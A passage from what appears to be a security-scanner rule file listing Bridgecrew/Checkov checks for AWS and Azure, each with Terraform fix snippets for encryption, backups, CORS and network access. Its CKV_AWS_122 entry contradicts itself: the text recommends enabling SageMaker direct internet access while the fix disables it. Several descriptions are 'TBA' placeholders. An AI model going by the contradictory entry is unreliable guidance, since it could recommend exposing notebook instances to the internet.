<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_lambda_function" "test_lambda" {
  ...
  vpc_config {
    // Every subnet should be able to reach an EFS mount target in the same Availability Zone. 
    // Cross-AZ mounts are not permitted.
+   subnet_ids         = [aws_subnet.subnet_for_lambda.id]
    security_group_ids = [aws_security_group.sg_for_lambda.id]
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-inside-a-vpc-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-inside-a-vpc-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-inside-a-vpc-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_118</key>
    <name>Ensure enhanced monitoring for Amazon RDS instances is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="enhanced-monitoring-for-amazon-rds-instances-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-enhanced-monitoring-for-amazon-rds-instances-is-disabled"></div>Enhanced monitoring for Amazon RDS instances is disabled</div><a aria-label="Skip link to Enhanced monitoring for Amazon RDS instances is disabled" class="heading-anchor-icon fa fa-anchor" href="#enhanced-monitoring-for-amazon-rds-instances-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_db_instance</li>
<li><strong>Argument:</strong> monitoring_interval</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_db_instance" "default" {
  allocated_storage    = 10
  ...
+ monitoring_interval  = 5
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-enhanced-monitoring-is-enabled-for-amazon-rds-instances' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-enhanced-monitoring-is-enabled-for-amazon-rds-instances</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-enhanced-monitoring-is-enabled-for-amazon-rds-instances' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_119</key>
    <name>Ensure DynamoDB tables are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="unencrypted-dynamodb-tables"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-unencrypted-dynamo-db-tables"></div>Unencrypted DynamoDB tables</div><a aria-label="Skip link to Unencrypted DynamoDB tables" class="heading-anchor-icon fa fa-anchor" href="#unencrypted-dynamodb-tables"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Checks if the Amazon DynamoDB tables are encrypted, and in line with AWS best security practice - with a specified non-default KMS key.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_dynamodb_table</li>
<li><strong>Argument:</strong> server_side_encryption</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_dynamodb_table" "basic-dynamodb-table" {
  ...
  server_side_encryption {
+    enabled = true
+    kms_key_arn= aws_kms_key.dynamo.arn
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-dynamodb-tables-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-dynamodb-tables-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-dynamodb-tables-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_122</key>
    <name>Ensure AWS SageMaker notebook instance is configured with direct internet access feature</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-sagemaker-notebook-instance-is-not-configured-with-direct-internet-access-feature"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-sage-maker-notebook-instance-is-not-configured-with-direct-internet-access-feature"></div>AWS SageMaker notebook instance is not configured with direct internet access feature</div><a aria-label="Skip link to AWS SageMaker notebook instance is not configured with direct internet access feature" class="heading-anchor-icon fa fa-anchor" href="#aws-sagemaker-notebook-instance-is-not-configured-with-direct-internet-access-feature"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>We recommend that Direct Internet Access is <strong>enabled</strong> for an Amazon SageMaker Notebook Instances.<br/>
TBA. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_sagemaker_notebook_instance</li>
<li><strong>Argument:</strong> direct_internet_access</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_sagemaker_notebook_instance" "test" {
                  name          = "my-notebook-instance"
                  role_arn      = aws_iam_role.role.arn
                  instance_type = "ml.t2.medium"
+                 direct_internet_access = "Disabled"
                                  
                  tags = {
                    Name = "foo"
                  }
                }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-direct-internet-access-is-disabled-for-an-amazon-sagemaker-notebook-instance' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-direct-internet-access-is-disabled-for-an-amazon-sagemaker-notebook-instance</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-direct-internet-access-is-disabled-for-an-amazon-sagemaker-notebook-instance' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_131</key>
    <name>Ensure that ALB drops HTTP headers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alb-does-not-drop-http-headers"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alb-does-not-drop-http-headers"></div>ALB does not drop HTTP headers</div><a aria-label="Skip link to ALB does not drop HTTP headers" class="heading-anchor-icon fa fa-anchor" href="#alb-does-not-drop-http-headers"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that Drop Invalid Header Fields feature is enabled for your Amazon Application Load Balancers (ALBs) in order to follow security best practices and meet compliance requirements. If Drop Invalid Header Fields security feature is enabled, HTTP headers with header fields that are not valid are removed by the Application Load Balancer instead of being routed to the associated targets.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_alb</li>
<li><strong>Argument:</strong> drop_invalid_header_fields</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_alb" "test_success" {
                    name               = "test-lb-tf"
                    internal           = false
                    load_balancer_type = "network"
                    subnets            = aws_subnet.public.*.id
 +                  drop_invalid_header_fields = true
                }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-alb-drops-http-headers' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-alb-drops-http-headers</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-alb-drops-http-headers' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_133</key>
    <name>Ensure RDS instances have backup policy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-rds-instance-without-automatic-backup-setting"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-rds-instance-without-automatic-backup-setting"></div>AWS RDS instance without automatic backup setting</div><a aria-label="Skip link to AWS RDS instance without automatic backup setting" class="heading-anchor-icon fa fa-anchor" href="#aws-rds-instance-without-automatic-backup-setting"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This check examines the attribute <strong>backup_retention_period</strong> this should have a value 1-35, and checks if its set to 0 which would disable the backup.</p>
<p><em>This check is currently under review and maybe suppressed in future releases.</em></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>n/a</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_rds_cluster</li>
<li><strong>Argument:</strong> backup_retention_period</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_rds_cluster" "test" {
  ...
+ backup_retention_period = 35
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-rds-instances-have-backup-policy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-rds-instances-have-backup-policy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-rds-instances-have-backup-policy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_134</key>
    <name>Ensure Amazon ElastiCache Redis clusters have automatic backup turned on</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="amazon-elasticache-redis-clusters-do-not-have-automatic-backup-turned-on"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-amazon-elasti-cache-redis-clusters-do-not-have-automatic-backup-turned-on"></div>Amazon ElastiCache Redis clusters do not have automatic backup turned on</div><a aria-label="Skip link to Amazon ElastiCache Redis clusters do not have automatic backup turned on" class="heading-anchor-icon fa fa-anchor" href="#amazon-elasticache-redis-clusters-do-not-have-automatic-backup-turned-on"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon ElastiCache clusters running Redis can back up their data. Using automated backup, you can restore a cluster or seed a new cluster. The backup consists of the cluster's metadata, along with all of the data in the cluster. </p>
<p>You can enable or disable automatic backups on an existing Redis cluster or replication group by modifying it using the ElastiCache console, the AWS CLI, or the ElastiCache API. For any Redis cluster, you can enable automatic backups. When automatic backups are enabled, ElastiCache creates a backup of the cluster on a daily basis. There is no impact on the cluster and the change is immediate.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_elasticache_cluster</li>
<li><strong>Argument:</strong> snapshot_retention_limit</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elasticache_cluster" "example" {
  ...
+ snapshot_retention_limit = 5
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-amazon-elasticache-redis-clusters-have-automatic-backup-turned-on' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-amazon-elasticache-redis-clusters-have-automatic-backup-turned-on</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-amazon-elasticache-redis-clusters-have-automatic-backup-turned-on' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_61</key>
    <name>Ensure Azure Security Center Defender is set to On for app service</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-security-center-defender-is-set-to-off-for-app-service"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-security-center-defender-is-set-to-off-for-app-service"></div>Azure Security Center Defender is set to Off for app service</div><a aria-label="Skip link to Azure Security Center Defender is set to Off for app service" class="heading-anchor-icon fa fa-anchor" href="#azure-security-center-defender-is-set-to-off-for-app-service"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). </p>
<p>Azure Defender for App Service detects attacks targeting applications running over App Service. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_security_center_subscription_pricing</li>
<li><strong>Argument:</strong> resource_type - (Required) The resource type this setting affects. Ensure that <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">AppServices</code> is declared to pass this check.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_subscription_pricing" "example" {
  tier          = "Standard"
  resource_type = "AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-app-service' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-app-service</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-app-service' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_62</key>
    <name>Ensure CORS does not allow resources to access function apps</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cors-allows-resources-to-access-function-apps"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cors-allows-resources-to-access-function-apps"></div>CORS allows resources to access function apps</div><a aria-label="Skip link to CORS allows resources to access function apps" class="heading-anchor-icon fa fa-anchor" href="#cors-allows-resources-to-access-function-apps"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cross-Origin Resource Sharing (CORS) should not allow all domains to access your Function app. Allow only required domains to interact with your Function app.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_function_app</li>
<li><strong>Argument:</strong> site_config.cors</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_function_app" "example" {
                ...
                site_config {
+                 cors {
+                     allowed_origins = ["192.0.0.1"]
                  }
                }
              }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-cors-disallows-every-resource-to-access-function-apps' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-cors-disallows-every-resource-to-access-function-apps</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-cors-disallows-every-resource-to-access-function-apps' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_64</key>
    <name>Ensure Azure file sync disables public network access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-file-sync-enables-public-network-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-file-sync-enables-public-network-access"></div>Azure file sync enables public network access</div><a aria-label="Skip link to Azure file sync enables public network access" class="heading-anchor-icon fa fa-anchor" href="#azure-file-sync-enables-public-network-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_storage_sync</li>
<li><strong>Argument:</strong> incoming_traffic_policy</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_sync" "test" {
                            ...
+             incoming_traffic_policy = AllowVirtualNetworksOnly
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-file-sync-disables-public-network-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-file-sync-disables-public-network-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-file-sync-disables-public-network-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_65</key>
    <name>Ensure app service enables detailed error messages</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="app-service-disables-detailed-error-messages"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-app-service-disables-detailed-error-messages"></div>App service disables detailed error messages</div><a aria-label="Skip link to App service disables detailed error messages" class="heading-anchor-icon fa fa-anchor" href="#app-service-disables-detailed-error-messages"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> detailed_error_messages_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
             ...
+            logs {
+               detailed_error_messages_enabled = true
+            }
             ...
    }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/tbdensure-that-app-service-enables-detailed-error-messages' target='_blank'> https://docs.bridgecrew.io/docs/tbdensure-that-app-service-enables-detailed-error-messages</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/tbdensure-that-app-service-enables-detailed-error-messages' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_66</key>
    <name>Ensure app service enables failed request tracing</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="app-service-does-not-enable-failed-request-tracing"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-app-service-does-not-enable-failed-request-tracing"></div>App service does not enable failed request tracing</div><a aria-label="Skip link to App service does not enable failed request tracing" class="heading-anchor-icon fa fa-anchor" href="#app-service-does-not-enable-failed-request-tracing"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> logs.failed_request_tracing_enabled</li>
</ul>
